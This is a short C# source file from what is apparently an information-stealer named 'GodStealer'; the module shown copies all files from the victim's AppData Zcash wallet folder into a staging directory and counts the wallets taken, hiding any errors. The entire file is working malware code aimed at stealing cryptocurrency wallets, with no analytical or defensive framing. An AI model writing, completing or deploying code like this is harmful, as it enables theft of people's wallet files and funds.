﻿using System.IO;

namespace GodStealer
{
    class Zcash
    {
        public static int count = 0;
        public static string ZcashDir = "\\Wallets\\Zcash\\";
        public static void ZecwalletStr(string directorypath)  // Works
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppData + "\\Zcash\\").GetFiles())

                {
                    Directory.CreateDirectory(directorypath + ZcashDir);
                    file.CopyTo(directorypath + ZcashDir + file.Name);
                }
                Counting.Wallets++;
            }
            catch { return; }

        }
    }
}
